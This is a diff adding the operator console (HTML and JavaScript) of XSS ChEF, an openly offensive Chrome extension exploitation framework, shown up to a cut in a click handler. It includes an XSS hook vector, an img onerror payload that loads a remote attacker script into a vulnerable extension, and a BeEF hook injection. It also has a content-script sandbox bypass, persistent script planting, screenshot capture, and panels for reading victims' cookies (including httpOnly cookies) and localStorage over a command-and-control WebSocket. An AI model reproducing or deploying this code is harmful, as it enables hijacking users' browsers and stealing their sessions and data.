@@ -1,0 +1,1208 @@
+<!doctype html>
+<html>
+<head>
+<!--
+    XSS ChEF - Chrome Extension Exploitation framework
+    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+-->
+<script src="bootstrap/js/jquery.min.js"></script>
+<script src="bootstrap/js/bootstrap.min.js"></script>
+<title>XSS ChEF console</title>
+<link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
+<style>
+h5 {
+margin-top: 1em;
+margin-bottom: 0.5em;
+}
+input {
+padding: 0;
+}
+body {
+padding-top: 50px;
+}
+
+#logo {
+min-height: 170px;
+background: url(bootstrap/img/xss-chef-medium.png) right 20px no-repeat;
+
+}
+
+#about-modal {
+    width: 620px;
+    marzgin: 0 0 0 -300px; /* -1 * (width / 2) */ 
+}
+
+#about-modal .modal-body {
+background: url(bootstrap/img/xss-chef.png) 95% top no-repeat;
+padding-right: 220px;
+min-height: 300px;
+}
+
+span,td,th {font-size: 11px; line-height: 14px;}
+#tabs-container {
+overflow-y: auto;
+}
+#readme {max-height: 400px; overflow-y: auto;}
+.currentTableRow td {
+background-color: #0088CC !important;
+color: #FFFFFF !important;
+}
+
+.screenshot-saved-images {max-height: 100px; overflow-y: auto; margin: 0.5em;}
+
+.modal {
+display:none;
+}
+.wide-modal {
+    top: 3em;
+    width: 800px;
+    margin: 0 0 0 -400px; /* -1 * (width / 2) */ 
+}
+.screenshot-modal {
+    top: 3em;
+    width: 1000px;
+    margin: 0 0 0 -500px; /* -1 * (width / 2) */ 
+}
+.mono {
+font-family: Menlo, Monaco, "Courier New", monospace;
+white-space: pre;
+}
+#alert {
+position: fixed;
+top: 45px;
+right: 20px;
+display:none;
+}
+</style>
+</head>
+<body>
+<div class="navbar navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+        <ul class="nav pull-right">
+            <li><a href="#about-modal" data-toggle=modal>About</a></li>
+            <li><a href="#readme-modal" data-toggle=modal>Readme</a></li>
+            <li><a href="#hook-modal" data-toggle=modal>Hook code</a></li>
+            <li><a href="#saved-screenshots-modal" id=saved-screenshots-load  data-toggle=modal>Saved screenshots</a></li>
+        </ul>
+            <a class="brand"  href="#">XSS ChEF - Chrome Extension Exploitation Framework</a>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="row">
+        <div class="span12">
+            <div class="tabbable">
+                <ul class="nav nav-tabs">
+                    <li><button title="Choose hooked session" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;<button id=current-hook class='btn btn-secondary'><i class="icon-tag"></i><span id=current-hook-name></span></button>&nbsp;&nbsp;</li>
+                    <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
+                    <li><a href="#tab-persistent-scripts" data-toggle="tab">Persistent scripts</a></li>
+                    <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
+                    <li><a href="#tab-ext-commands" data-toggle="tab">Extension commands</a></li>
+                    <li> <button id=refresh-hook title="Refresh this hook" class='btn btn-secondary'><i class="icon-refresh"></i></button> </li>
+                </ul>
+                <div class="tab-content">
+                    <div class="tab-pane" id="tab-persistent-scripts">
+                        <ul class="nav nav-tabs">
+                        <li class="active"><a data-toggle="tab" href="#tab-persistent-scripts-manage">Manage</a></li>
+                        <li><a data-toggle="tab" href="#tab-persistent-scripts-log">Results log</a></li>
+                        </ul>
+                        <div class="tab-content">
+                        <div class="tab-pane active" id="tab-persistent-scripts-manage">
+                            <p>Persistent scripts are scripts that are run on hooked browser tabs
+                               on every page load if the URL matches given regexp.
+                            </p>
+                            <h5>Active scripts</h5>
+                            <ul id="persistent-script-list">
+                            <li style=display:none id=persistent-script-template><strong data-fld=name></strong>: <code data-fld=code></code> on <code data-fld=urlmatch>http://*</code> <a href="#" data="" data-fld="name" data-attr="data" title="remove script" class="remove-persistent-script btn btn-secondary"><i class="icon-remove"></i></a></li>
+                            </ul>
+                            <h5>Add persistent script</h5>
+                            <form id=add-persistent-script action="#">
+                            <label>Name</label>
+                            <input name="name" placeholder="anything you like" />
+                            <label>Launch this code:</label>
+                            <select id="persistent-snippets">
+                                <option value="">Choose code snippet...</option>
+                            </select><br />
+                            <p class="help-block">Use __logScript(script_name,object); to return results.</p>
+                            <textarea name=code class="mono span12" style="height: 150px" placeholder="alert(/onload/)"></textarea>
+                            <label>When tab URL matches</label>
+                            <input name="urlmatch" placeholder="^http" /> <span class="help-inline">Enter <a href="https://developer.mozilla.org/en/JavaScript/Guide/Regular_Expressions" target="_blank">Javascript RegExp</a></span>
+                            <label class=checkbox>
+                                <input type=checkbox name=run_now value=1 />Run now for existing tabs </label>
+                            <p><button class="btn btn-secondary">Add script</button></p>
+                            </form>
+                        </div>
+                        <div class="tab-pane" id="tab-persistent-scripts-log">
+                            <div style="max-height: 900px; overflow: auto">
+                            <table class="table-striped table table-condensed">
+                                <thead>
+                                    <tr>
+                                        <th>Date</th>
+                                        <th>Hook<br/>Script name</th>
+                                        <th>URL</th>
+                                        <th>Result</th>
+                                    </tr>
+                                    <tr style="display:none" id="persistent-script-log-template">
+                                        <td data-fld=date></td>
+                                        <td><span data-fld=hook></span><br/><span data-fld=name></span></td>
+                                        <td data-fld=url></td>
+                                        <td data-fld=result class=mono></td>
+                                    </tr>
+                                </thead>
+                                <tbody id=persistent-script-log>
+                                </tbody>
+                            </table>
+                            </div>
+                            <p><button id="clear-persistent-scripts-log">Clear log</button></p>
+                        </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane active" id="tab-tabs">
+                        <div class="row">
+                            <div class="span5" id="tabs-container">
+                                <table class="table-striped table table-condensed">
+                                <thead>
+                                <tr>
+                                    <th>
+                                        ID
+                                    </th>
+                                    <th>Window</th>
+                                    <th>
+                                        Title
+                                    </th>
+                                </tr>
+                                <tr style=display:none id=tab-template>
+                                    <td data-fld=id>
+                                    </td>
+                                    <td data-fld=windowId>
+                                    </td>
+                                    <td class="url">
+                                        <a href=# target=_blank data-attr=href data-fld=url><i class="icon-share"></i></a>
+                                        <img data-fld=favIconUrl style="max-width:16px;max-height:16px" data-attr=background src="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACBAAAeaR9cIAAAAASUVORK5CYII=" />
+                                        <span data-fld=title></span>
+                                    </td>
+                                    </tr>
+                
+                                </thead>
+                                <tbody id="hook-tabs">
+                                    </tbody>
+                                    </table>
+
+                                <h5>Legend</h5>
+                                <p></p>
+                                <ul class="unstyled">
+                                <li><i class="icon-list"></i> choose hooked browser session</li>
+                                <li><i class="icon-refresh"></i> refresh tab list from session</li>
+                                <li><i class="icon-share"></i> launch URL in this browser</li>
+                                <li><i class="icon-exclamation-sign"></i> launching this might be visible in hooked browser</li>
+                                </ul>
+                                <p><a class="btn btn-secondary" href="#hook-modal" data-toggle=modal>Get hook code</a></p>
+                                </div>
+                                <div class="span7">
+                                    <div class="tabbable">
+                                        <ul class="nav nav-tabs">
+                                            <li class="active"><a href="#tab-info" class='active' data-toggle="tab">Info</a></li>
+                                            <li><a href="#tab-commands" data-toggle="tab">Commands</a></li>
+                                            <li><a href="#tab-html" data-toggle="tab">HTML</a></li>
+                                        </ul>
+                                        <div id=current-tab class="tab-content">
+                                            <div class="tab-pane" id="tab-commands">
+                                                <p>
+                                                <button id=do-focus class='btn btn-secondary' title="Set focus on this tab">Set focus <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                <button id=do-tab-screenshot title="Take a screenshot" class='btn btn-secondary'><i class="icon-picture"></i> Screenshot <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                <button id=do-hook-beef title="Attach BeEF hook to this tab (experimental)" class='btn btn-secondary'>Hook BeEF</button>
+                                                </p>
+                                                <form action="#">
+                                                    <h5>Eval</h5>
+                                                    <select class="pull-right" id="eval-snippets">
+                                                    <option value="">Choose code snippet...</option>
+                                                    </select>
+                                                    <p class="help-block">Use __logEval(object); to return results asynchronously.</p>
+                                                    <textarea class=mono name=eval style="width: 100%; height: 100px" placeholder="alert(/place code to eval in this tab here/)"></textarea>
+                                                    <button id=eval title="Evaluate code in Chrome content script sandbox - you can't call page original JS" type="button" class="btn btn-secondary">Eval<i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                    <button id=eval-no-sandbox title="Try to evaluate code outside Chrome content script sandbox by attaching dynamic &lt;script&gt;. No results will be available." type="button" class="btn btn-secondary">Eval outside sandbox (experimental, blind) <i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                    </p>
+                                                    <textarea class=mono style="width: 100%; height: 300px" id=eval-result placeholder="result will be placed here."></textarea>
+                                                </form>
+                                            </div>
+                                            <div class="tab-pane" id="tab-html">
+                                                <p><button id=report-html type=button class="btn btn-secondary">Get HTML</button></p>
+                                                <textarea data-fld=html id=tab-current-html style="width: 100%; height: 300px">
+                                                </textarea>
+                                                <h5>Links (click to navigate in tab) <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></h5>
+                                                <ul id=links></ul>
+                                            </div>
+                                            <div class="tab-pane active" id="tab-info">
+                                                <p>
+                                                <button id=report-page-info class="btn btn-secondary">Get cookies etc.</button>
+                                                </p>
+                                                <table class="table-striped table table-condensed">
+                                                <tbody>
+                                                <tr>
+                                                <th>URL</th><td data-fld=url></td>
+                                                </tr>
+                                                <tr>
+                                                <th>Cookies</th><td class=mono data-fld=cookies></td>
+                                                </tr>
+                                                <tr>
+                                                <th>Cookies w/httpOnly</th><td class=mono data-fld=allcookies></td>
+                                                </tr>
+                                                <tr>
+                                                <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                                                </tr>
+                                                </tbody>
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane" id="tab-ext-info">
+                        <table class="table-striped table table-condensed">
+                        <tbody>
+                        <tr>
+                        <th>Hook ID</th><td id=hook-id></td>
+                        </tr>
+                        <tr>
+                        <th>Extension URL</th><td data-fld=extension></td>
+                        </tr>
+                        <tr>
+                        <th>Permissions</th><td class=mono data-fld=permissions></td>
+                        </tr>
+
+                        <tr>
+                        <th>Cookies</th><td class=mono data-fld=cookies></td>
+                        </tr>
+                        <tr>
+                        <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
+                        </tr>
+                        <tr>
+                        <th>Extension HTML</th><td><textarea style="width: 100%; height:200px" data-fld=html></textarea></td>
+                        </tr>
+
+                        </tbody>
+                        </table>
+                    
+                        </form>
+                        </div>
+                        <div class="tab-pane" id="tab-ext-commands">
+                        <p>
+                        <button id=fix-server class='btn btn-secondary'><i class="icon-fire"></i> Fix server</button>
+                        <button id=ping class='btn btn-secondary'>Ping</button>
+                        <button id=do-screenshot class='btn btn-secondary'><i class="icon-picture"></i> Active tab screenshot</button>
+                        </p>
+                        <div class=control-group>
+
+            <h5>Create new tab <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></h5>
+            <input id="tab-create-url" placeholder="http://example.com/enter-to-open" />
+                            <form action="#">
+                                <h5>Eval</h5>
+                                <select id="eval-ext-snippets">
+                                <option value="">Choose code snippet...</option>
+                                </select>
+                                <p class="help-block">Use __logEval(object) to return result asynchronously, also <a target=_blank href="http://code.google.com/chrome/extensions/api_index.html">see extension API docs</a></p>
+                                <textarea name=eval-ext style="height: 150px" class="mono span12" placeholder="alert(/place code to eval in extension/)"></textarea>
+                                <p><button type="button" id=eval-ext class="btn btn-secondary">Eval <i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button></p>
+                                <textarea id=eval-ext-result style="height: 150px" class="mono span12" placeholder="eval result will be placed here."></textarea>
+                            </form>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        <div class="row">
+            <div class="span10">
+                    <label>Log</label>
+                        <textarea id='log' style="width: 100%; height: 150px;"></textarea>
+                    </div>
+            <div id="logo" class="span2">
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal" id="screenshot-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Screenshot</h3>
+  </div>
+  <div class="modal-body">
+    <img id=screenshot />
+  </div>
+  <div class="modal-footer">
+    <input type="textbox" id=screenshot-description class="row-fluid" placeholder="Give this screenshot a description">
+    <button type="button" id=screenshot-save class="btn btn-secondary">Save Screenshot (experimental)</button>
+    <a href="#" target=_blank type="button" id=screenshot-open class="btn btn-secondary">Open in Tab</a>
+  </div>
+</div>
+
+<div class="modal" id="choose-hook-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Choose hooked session</h3>
+  </div>
+  <div class="modal-body">
+  <p>Each hook below represents single browser session that XSS has been activated in. Chose one you'd like to
+  exploit:</p>
+  <select size=10 class="row-fluid" name="choose-hook">
+  </select>
+  </div>
+  <div class=modal-footer>
+  <a href="#" id=hook-chosen class="btn btn-primary">Choose hook</a>
+  <a href="#" class="btn" data-dismiss=modal>Cancel</a>
+</div>
+</div>
+
+<div class="modal" id="current-hook-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Hooked session details</h3>
+  </div>
+  <div class="modal-body">
+    <p>Below are details about your currently selected hook.</p>
+    <p name="current-hook"></p>
+    <input size=10 class="row-fluid" name="current-hook-name">
+  </div>
+  <div class=modal-footer>
+    <a href="#" id=save-hook-name class="btn btn-primary">Save hook name</a>
+  </div>
+</div>
+<div class="modal" id="about-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>About XSS ChEF</h3>
+  </div>
+  <div class="modal-body">
+      <h2><a href="https://github.com/koto/xsschef/">XSS ChEF </a><small>ver 1.0</small></h2>
+      <h3>Chrome Extension Exploitation Framework</h3>
+      <address>by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a></address><address> Logo design by <a href="http://www.thespanner.co.uk/">Gareth Heyes</a></address>
+      <p>This is a Chrome Extension Exploitation Framework - think <a href="http://beefproject.com/">BeEF</a> for Chrome extensions.
+      Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will ease the exploitation.
+      </p>
+  </div>
+</div>
+<div class="modal" id="hook-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Hook code</h3>
+  </div>  
+    <div class="modal-body">
+      <p>First, you need to find a XSS vulnerable Chrome extension. I won't help here. Once you've found it, inject Chrome extension with a hook vector:
+      <pre class="hook-url">if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='__HOOK_URL__';d.body.appendChild(e);}</pre>
+      <p>For example:
+      <pre class="hook-url">&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='__HOOK_URL__';d.body.appendChild(e);}"&gt;</pre>
+      <p>After hook has been executed, launch this console (in a separate browser), choose hooked session by clicking on the <i class="icon-list"></i> and start having fun!
+  </div>
+</div>
+
+<div class="modal wide-modal" id="readme-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Readme</h3>
+  </div>  
+    <div class="modal-body">
+    <pre id=readme>
+    </pre>
+  </div>
+</div>
+
+<div class="modal screenshot-modal" id="saved-screenshots-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Saved screenshots <small>(experimental)</small></h3>
+  </div>  
+  <div class="modal-body">
+      <div id=saved-screenshots>
+      </div>
+  </div>
+</div>
+
+<div id="alert" class="alert alert-info span3">
+  <a class="close" data-dismiss="alert">&times;</a>
+  <span id="alert-msg"></span>
+</div>
+<script>
+
+var ws;
+var DEFAULT_WS_HOST = document.location.host.replace(/:.*/, '') + ':8080';
+
+// current hook name
+var hook = ''; // localStorage['lastHook'] || '';
+var currentTab = null;
+
+if (window.mozIndexedDB) {
+	indexedDB = window.mozIndexedDB;
+} else if (window.webkitIndexedDB) {
+	indexedDB = window.webkitIndexedDB;
+}
+
+function getQueryStringParams() {
+       var query = document.location.search.slice(1);
+       var Params = {};
+       if (!query) { return Params; } // return empty object
+       var Pairs = query.split(/[;&]/);
+       for (var i = 0; i < Pairs.length; i++) {
+          var KeyVal = Pairs[i].split('=');
+          if (!KeyVal || KeyVal.length != 2) {continue;}
+          var key = unescape(KeyVal[0]);
+          var val = unescape(KeyVal[1]);
+          val = val.replace(/\+/g, ' ');
+          Params[key] = val;
+       }       
+       return Params;
+}
+
+function getParam(name) {
+    try {
+        // try to read from URL first
+        return getQueryStringParams()[name] 
+    } catch (e) {}
+}
+
+if (indexedDB) {
+	var db = null;
+	var req = indexedDB.open("xss-chef", 1);
+	
+	req.onsuccess = function(event) {
+		db = event.target.result;
+		if (db.setVersion && !db.objectStoreNames.contains('screenshots')) { // chrome
+			db.setVersion('1').onsuccess = function(e) {
+				req.init(db);
+			}
+		}
+	}
+	
+	req.onerror = function(event) {
+		al('Error opening indexed DB!');
+		if ($.browser.mozilla) {
+		    log('Set "dom.indexedDB.enabled" to true in about:config to enable screenshot db');
+		}
+	}
+	
+	req.onupgradeneeded = function(event) {
+		al('Upgrading DB...');
+		req.init(event.target.result);
+		db = event.target.result;
+	}
+	
+	req.init = function(o) {
+		o.createObjectStore("screenshots", {keyPath: "id", autoIncrement:true});
+	}
+}
+
+function updateHookName(hookName) {
+    if (hookName == undefined || hookStorage.retrieve(hook, 'name') == undefined){
+        $('#current-hook-name')[0].innerText = ' ' + hook
+    } else {
+        $('#current-hook-name')[0].innerText = ' ' + hookStorage.retrieve(hook, 'name') ||  hookName
+    }
+    return;
+}
+
+function prettyPrint(m) {
+    if (typeof m == 'string') {
+        return m === "" ? '""' : m;
+    }
+    return JSON.stringify(m, undefined, 3);
+}
+
+if (getParam('server_type') == 'xhr') { 
+    ws = false;
+} else { // backed by WebSockets server
+    try {
+    	if (typeof MozWebSocket !== 'undefined') {
+            WebSocket = MozWebSocket;
+        }
+    } catch(e) {}
+    function ReconnectingWebSocket(a,prot){function f(g){c=new WebSocket(a,prot);var h=c;var i=setTimeout(function(){e=true;h.close();e=false},b.timeoutInterval);c.onopen=function(c){clearTimeout(i);b.readyState=WebSocket.OPEN;g=false;b.onopen(c)};c.onclose=function(h){clearTimeout(i);c=null;if(d){b.readyState=WebSocket.CLOSED;b.onclose(h)}else{b.readyState=WebSocket.CONNECTING;if(!g&&!e){b.onclose(h)}setTimeout(function(){f(true)},b.reconnectInterval)}};c.onmessage=function(c){b.onmessage(c)};c.onerror=function(c){b.onerror(c)}}this.debug=false;this.reconnectInterval=1e3;this.timeoutInterval=2e3;var b=this;var c;var d=false;var e=false;this.url=a;this.prot=prot;this.readyState=WebSocket.CONNECTING;this.URL=a;this.onopen=function(a){};this.onclose=function(a){};this.onmessage=function(a){};this.onerror=function(a){};f(a);this.send=function(d){if(c){return c.send(d)}else{throw"INVALID_STATE_ERR : Pausing to reconnect websocket"}};this.close=function(){if(c){d=true;c.close()}};this.refresh=function(){if(c){c.close()}}};
+    ws = new ReconnectingWebSocket(
+        // get absolute url of current doc
+        document.location.protocol.replace('http', 'ws') + '//'
+        + (getParam('ws_host') || DEFAULT_WS_HOST) + '/chef', 'chef');
+    if (!ws) {
+        alert("Trouble connecting through WebSocket, use PHP/XHR version (?server_type=xhr) or other browser.");
+    } else {
+        ws.onmessage = function(ev) {
+            try {
+                var json = JSON.parse(ev.data);
+                for (var i=0; i < json.length; i++) {
+                    processResponse(json[i][0],hook);
+                }
+            } catch (e) {}
+        }
+        ws.onopen = function() {
+            log('connection to server opened');
+            ws.send(JSON.stringify({cmd:'hello-c2c'}));
+            if (hook) {
+                ws.send(JSON.stringify({cmd:"set-channel",ch:hook}));
+                try {
+                    updateHookName(JSON.parse(localStorage['hooks'])[hook]['name'] || hook); // Bleh, hookStorage is defined below... lame! Maybe functions should be moved into their own block?
+                } catch (e) {}
+            }
+
+        }
+        ws.onclose = function() {
+            var s = "Connection to server dropped, will try reconnecting :(";
+            alert(s);
+            log(s);
+        }
+    }
+    var currentListCallback = al;   
+}
+
+var sendCmd = function(cmd, param, additional) {
+    var to_send = {cmd:cmd, p:param};
+    if (additional) {
+        $.extend(to_send, additional);
+    }
+    if (ws) {
+        ws.send(JSON.stringify({cmd:'command',p:to_send}));
+    } else {
+        $.post('server-xhr.php?ch=' + encodeURIComponent(hook) + '-cmd', JSON.stringify(to_send));
+    }
+};
+
+function log(m) {
+       var text = prettyPrint(m);
+        $("#log")[0].value += text + "\n";
+        $('#log')[0].scrollTop = 9999999;
+}
+
+function clickTab() {
+    loadTabData($(this).attr('data-tabid'));
+    currentTab = parseInt($(this).attr('data-tabid'),10);
+    $('.currentTableRow').removeClass('currentTableRow');
+    $(this).closest('tr').addClass('currentTableRow');
+}
+
+var hookStorage = {
+    store: function(hook, key, value) {
+        if (!localStorage['hooks']) {
+            localStorage['hooks'] = JSON.stringify({});
+        }
+        
+        var hooks = JSON.parse(localStorage['hooks']);
+
+        if (!hooks[hook]) {
+            hooks[hook] = {}
+        }
+        
+        hooks[hook][key] = value;
+        localStorage['hooks'] = JSON.stringify(hooks);
+    },
+    
+    updateTab: function(hook, id, data) {
+        var tab = this.getTab(hook, id);
+        this.setTab(hook, id, data);
+    },
+    
+    getTabs: function(hook) {
+        return this.retrieve(hook, 'tabs', []);
+    },
+    
+    setTabs: function(hook, tabs) {
+        return this.store(hook, 'tabs', tabs);
+    },
+    
+    getTab: function(hook, id) {
+        var tabs = this.getTabs(hook);
+        for (var i = 0; i < tabs.length; i++) {
+            if (tabs[i].id == id) {
+                return tabs[i];
+            }
+        }
+        return {}
+    },
+    
+    setTab: function(hook, id, tab) {
+        var tabs = this.getTabs(hook);
+        for (var i = 0; i < tabs.length; i++) {
+            if (tabs[i].id == id) { // tab exists
+                $.extend(true, tabs[i], tab);
+                this.setTabs(hook, tabs);
+                return;
+            }
+        }
+        tabs.push(tab); // new tab
+        this.setTabs(hook, tabs);
+        return;
+    },
+    
+    retrieve: function(hook, key, def) {
+        try {
+            return JSON.parse(localStorage['hooks'])[hook][key];
+        } catch (e) {
+            return def;
+        }
+        if (e == undefined)
+            return def;
+    }
+};
+
+function fillDataTemplate(node, data) {
+        $('[data-fld]', node).each(function() {
+            var j = this.attributes['data-fld'].value;
+            var text;
+            if (!data || typeof data[j] == 'undefined') {
+                text = '?';
+            } else {
+                text = prettyPrint(data[j]);
+            }
+
+            if (this.attributes['data-attr']) {
+                if (this.attributes['data-attr'].value == 'background') { // change background
+                    $(this).css('background-image', 'url("' + text + '")');
+                } else {
+                    $(this).attr(this.attributes['data-attr'].value, text);
+                }
+            } else {
+                if ($(this).is(':input')) {
+                    $(this).val(text);
+                } else {
+                    $(this).text(text);
+                }
+            }
+        });
+}
+
+function refreshTabsTable(t) {
+    $("#hook-tabs").html('');
+    for (var i = 0; i < t.length;  i++) {
+        var c = $('#tab-template').clone();
+        var tab = t[i];
+        c.attr('data-tabid', tab.id);
+        c.attr('id', '');
+        
+        fillDataTemplate(c, tab);
+        
+        c.click(clickTab);
+        c.appendTo('#hook-tabs').show();
+    }
+    if (currentTab) {
+        $('tr[data-tabid=' + parseInt(currentTab,10) + ']').click(); // reselect current tab
+    }
+}
+
+function displayPersistentLogEntry(entry) {
+    var c = $('#persistent-script-log-template').clone();
+    c.attr('id', '');
+    fillDataTemplate(c, entry);
+    c.prependTo('#persistent-script-log').show();
+}
+
+function refreshPersistentScriptLog(log) {
+    $("#persistent-script-log").html('');
+    for (var i = log.length - 1; i >= 0;  i--) {
+        displayPersistentLogEntry(log[i]);
+    }
+}
+
+function refreshPersistentScriptList(scripts) {
+    var clone = $('#persistent-script-template').clone();
+    $("#persistent-script-list").html('');
+    if (scripts) {
+	    for (var i = 0; i < scripts.length;  i++) {
+	        var c = $(clone).clone();
+	        c.attr('id', '');
+	        fillDataTemplate(c,scripts[i]);
+	        c.appendTo('#persistent-script-list').show();
+	    }
+    }
+    clone.appendTo('#persistent-script-list');
+}
+
+function loadTabData(id) {
+    var tab = hookStorage.getTab(hook,id);
+    if (!tab) {
+        alert('no tab!');
+        return;
+    }
+    $("#tab-current-html").val(tab.html);
+    $("#links").empty();
+    if (tab.links) {
+        tab.links.forEach(function(link) {
+            if (link.href) {
+                $('<a>')
+                    .attr('href',link.href)
+                    .text(link.title || link.href)
+                    .attr('title', link.title)
+                    .appendTo('#links')
+                    .wrap('<li>');
+            }
+        });
+    }
+    fillDataTemplate($('#tab-info'), tab);
+
+}
+
+function al(txt) {
+    $('#alert').queue(function() {
+        $('#alert-msg').text(txt);
+        $(this).dequeue();
+    }).fadeIn().delay(1000).fadeOut();
+}
+
+function getPersistentLog() {
+    var tmp;
+    try {
+        tmp = JSON.parse(localStorage['persistentLog']) 
+    } catch (e) {}
+    return tmp || [];
+}
+
+function processResponse(r, hook) {
+    if (typeof r == 'string' || !r.type) {
+        log(r);
+        console.log(r);
+        return;
+    }
+    switch (r.type) {
+        case 'recvstuff':
+            hookStorage.updateTab(hook, r.id, r.result);
+            refreshTabsTable(hookStorage.getTabs(hook));
+            al('Received response.');
+        break;
+        case 'recvpersistent':
+            // add whatever is received into persistent script log
+            var entry = { date: new Date(), hook: hook, id: r.id, url:r.url, result: r.result, name: r.name };
+            var tmp = getPersistentLog();
+            tmp.push(entry);
+            localStorage['persistentLog'] = JSON.stringify(tmp);
+            displayPersistentLogEntry(entry);
+            al('Received response from persistent script');
+        break;
+        case 'recvscreenshot':
+            $("#screenshot").attr('src', r.url);
+            $("#screenshot-open").attr('href', r.url);
+            $('#screenshot-modal').modal('show');
+        break;        
+        case 'recveval':
+            var result = prettyPrint(r.result);
+            if (result == undefined) {
+                al('Eval response was undefined');
+            } else {
+                al('Received eval response.');
+                if (!r.id) {
+                    $('#eval-ext-result').val(result);
+                } else {
+                    $('#eval-result').val(result);
+                }
+            }
+        break;
+        case 'report_tabs':
+            hookStorage.setTabs(hook, r.result);
+            refreshTabsTable(hookStorage.getTabs(hook));
+            al('New tab list received');
+        break;
+        case 'report_persistent':
+            hookStorage.store(hook, 'persistent', r.result);
+            refreshPersistentScriptList(r.result);
+            al('New persistent scripts list received');
+        case 'report_ext':
+            hookStorage.store(hook, 'info', r.result);
+            fillDataTemplate($('#tab-ext-info'), r.result);
+        break;
+        case 'pong':
+            al('Pong from ' + r.url);
+            log('pong from ' + r.url);
+        break;
+        case 'server_msg':
+            al(r.result);
+        break;
+        case 'list':
+            al(r);
+            currentListCallback(r.result);
+        break;
+    }
+}
+
+$(function() {
+
+    var hook_url = document.location.href
+                .replace(/\/console\.html.*/, '/hook.php');
+    
+    var hook_params = "";
+    if (getParam('server_type') == 'xhr') {
+        hook_params +='t=xhr';
+    }
+    if (getParam('ws_host') && getParam('ws_host') !== DEFAULT_WS_HOST) {
+        hook_params += '&h=' + escape(getParam('ws_host'));
+    }
+    
+    if (hook_params) {
+        hook_url += '?' + hook_params.replace(/^&/, ''); 
+    }
+
+    $('.hook-url').each(function() {$(this).text($(this).text().replace(/__HOOK_URL__/g, hook_url)) });
+
+    $('#do-screenshot').click(function() {
+        sendCmd('screenshot');
+    });
+
+    function evalWithSandboxBypass(code, tab_id) {
+        var wrapper = "(function() {\n\
+    var d=document;\n\
+    var s = d.createElement('script');\n\
+    s.textContent = unescape('__CODE__');\n\
+    d.body.appendChild(s);\n\
+    })();";
+        var wrapped_code = wrapper.replace('__CODE__', escape(code));
+        sendCmd('eval', wrapped_code, {id: tab_id});
+    }
+
+    $('#do-hook-beef').click(function() {
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        var beef = prompt("BeEF Hook URL", 'http://127.0.0.1:3000/hook.js');
+        if (!beef) {
+            al("Cancelled BeEF hooking");
+            return;
+        }
+        var step1 = "(function() {\n\
+var d=document;\n\
+var s = d.createElement('script');\n\
+s.src = " + JSON.stringify(beef) + "; // BeEF hook here\n\
+s.setAttribute('onload','beef_init();');\n\
+d.body.appendChild(s);\n\
+})();";
+        al("BeEF hooking " + beef + " part 1");
+        sendCmd('eval', step1, {id: currentTab});
+        return false;
+    });
+
+    $('#do-tab-screenshot').click(function() {
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        sendCmd('screenshot', null, {id: currentTab});
+    });
+
+
+    $('#eval-ext').click(function() {
+        sendCmd('eval', $('[name=eval-ext]').val());
+        $('#eval-ext-result').val('');
+    });
+
+    $('#eval').click(function() {
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
+        $('#eval-result').val('');
+    });
+
+
+    $('#eval-no-sandbox').click(function() {
+        // create dynamic script URL to load in page
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        evalWithSandboxBypass($('[name=eval]').val(), currentTab);
+        $('#eval-result').val('no results for blind requests...');
+    });
+
+    $('#report-html').click(function() {
+        sendCmd('reporthtml', null, {id: currentTab});
+    });
+
+    $('#do-focus').click(function() {
+        sendCmd('focus', null, {id: currentTab});
+    });
+
+    $('#report-page-info').click(function() {
